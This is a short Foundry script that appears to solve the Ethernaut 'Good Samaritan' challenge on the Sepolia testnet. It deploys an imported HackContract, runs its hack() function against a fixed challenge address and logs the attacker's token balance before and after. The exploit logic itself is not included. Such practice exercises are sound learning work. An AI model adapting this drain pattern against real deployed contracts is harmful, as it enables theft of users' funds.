// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {Script, console} from "forge-std/Script.sol";

import {HackContract, GoodSamaritan, Coin} from "../src/GoodSamartian.sol";

contract GoodSamartianScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address goodSamartianContractAddress = 0x5D091C3C1d4c39fDbca752fA93690940444356A8;

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        GoodSamaritan goodSamartian = GoodSamaritan(goodSamartianContractAddress);

        Coin token = goodSamartian.coin();

        HackContract hackGoodSamartian = new HackContract();

        console.log("InitialBalance:", token.balances(address(hackGoodSamartian)));

        hackGoodSamartian.hack(goodSamartianContractAddress);

        console.log("FinalBalance:", token.balances(address(hackGoodSamartian)));

        vm.stopBroadcast();
    }
}
